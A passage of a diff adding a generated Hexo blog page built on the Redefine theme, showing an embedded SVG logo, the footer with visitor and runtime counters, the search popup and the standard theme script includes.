QyLjcsMC42IEM0Mi43LDAuMyA0Mi41LDAgNDIuMSwwIFoiLz4KICAgICAgPHBhdGggZD0iTTY0LjIsMC45IEw1Mi4yLDAuOSBDNTEuOSwwLjkgNTEuNiwxLjIgNTEuNiwxLjUgTDUxLjYsMi40IEM1MS42LDIuNyA1MS45LDMgNTIuMiwzIEw2NC4yLDMgQzY0LjUsMyA2NC44LDIuNyA2NC44LDIuNCBMNjQuOCwxLjUgQzY0LjgsMS4yIDY0LjUsMC45IDY0LjIsMC45IFoiLz4KICAgICAgPHBhdGggZD0iTTU5LjEsMTEuMiBMNjcuNSwxMS4yIEM2Ny44LDExLjIgNjguMSwxMC45IDY4LjEsMTAuNiBMNjguMSw5LjcgQzY4LjEsOS40IDY3LjgsOS4xIDY3LjUsOS4xIEw0OC45LDkuMSBDNDguNiw5LjEgNDguMyw5LjQgNDguMyw5LjcgTDQ4LjMsMTAuNiBDNDguMywxMC45IDQ4LjYsMTEuMiA0OC45LDExLjIgTDU0LjYsMTEuMiBDNTUuMSwxMS4yIDU1LjMsMTEuNyA1NS4xLDEyLjEgTDUxLjMsMTkgQzUxLjIsMTkuMiA1MS4xLDE5LjMgNTEuMSwxOS41IEM1MC44LDIwLjQgNTAuOSwyMS40IDUxLjUsMjIuMiBDNTIuMSwyMyA1My4xLDIzLjYgNTQuMiwyMy42IEw2NC42LDIzLjYgQzY1LjEsMjMuNiA2NS41LDIzLjQgNjUuNywyMyBDNjUuOSwyMi42IDY2LDIyLjEgNjUuOCwyMS43IEw2My40LDE3IEM2My4zLDE2LjcgNjIuOSwxNi42IDYyLjYsMTYuOCBMNjEuOCwxNy4yIEM2MS41LDE3LjMgNjEuNCwxNy43IDYxLjYsMTggTDYzLDIwLjggQzYzLjIsMjEuMiA2Mi45LDIxLjYgNjIuNSwyMS42IEw1NC4yLDIxLjYgQzUzLjgsMjEuNiA1My40LDIxLjQgNTMuMiwyMS4xIEM1My4xLDIxIDUyLjksMjAuNyA1MywyMC4zIEM1MywyMC4yIDUzLDIwLjIgNTMuMSwyMC4xIEw1Ny43LDEyIEM1OCwxMS41IDU4LjUsMTEuMiA1OS4xLDExLjIgWiIvPgogICAgPC9nPgogIDwvZz4KPC9zdmc+Cg=="><a></div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Thou</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/Swup.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupSlideTheme.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupScriptsPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupProgressPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupScrollPlugin.min.js"></script><script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/SwupPreloadPlugin.min.js"></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+<script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/imageViewer.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/utils.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/main.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/navbarShrink.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/scrollTopBottom.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/lightDarkSwitch.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/categoryList.js"></script>
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/localSearch.js"></script>
+
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/codeBlock.js"></script>
+
+
+
+    <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/runtime.js"></script>
+    <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/odometer.min.js"></script>
+    <link rel="stylesheet" href="//cdn.staticfile.org/hexo-theme-redefine/2.5.0/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/Typed.min.js"></script>
+  <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        <script src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/libs/anime.min.js"></script>
+        <script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/tools/tocToggle.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/layouts/toc.js"></script><script type="module" src="https://cdn.staticfile.org/hexo-theme-redefine/2.5.0/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+</body>
+</html>
